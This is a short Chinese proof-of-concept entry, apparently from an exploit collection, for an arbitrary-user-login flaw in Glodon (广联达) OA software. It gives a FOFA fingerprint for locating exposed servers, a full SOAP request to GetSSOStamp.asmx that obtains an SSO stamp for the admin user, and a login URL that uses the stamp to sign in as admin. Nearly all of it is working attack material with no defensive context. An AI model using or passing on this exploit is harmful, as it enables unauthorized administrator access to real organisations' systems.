##  广联达OA任意用户登录

## fofa
```
fid="/yV4r5PdARKT4jaqLjJYqw=="
```

## poc
```
POST /WebService/Lk6SyncService/DirectToOthers/GetSSOStamp.asmx HTTP/1.1
Host: x
Content-Type: text/xml; charset=utf-8
Content-Length: 355
SOAPAction: "http://tempuri.org/GetStamp"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
 <soap:Body>
   <GetStamp xmlns="http://tempuri.org/">
     <usercode>
admin</usercode>
   </GetStamp>
 </soap:Body>
</soap:Envelope>
```

登录接口
```
/Services/Identification/Server/login.ashx?sso=1&ssoProvider=WorkflowSSO&LoginFlag=custom&UserCode=admin&LoginCredence=856F1154F61FE89FDE236B64F565502C&LoginTimestamp=758027442&service=http://xxxxxx/Portal/Frame/layoutA/Default.aspx
```

## 漏洞来源
- https://mp.weixin.qq.com/s/4ri-afLF1knxX3IDV0hKjw
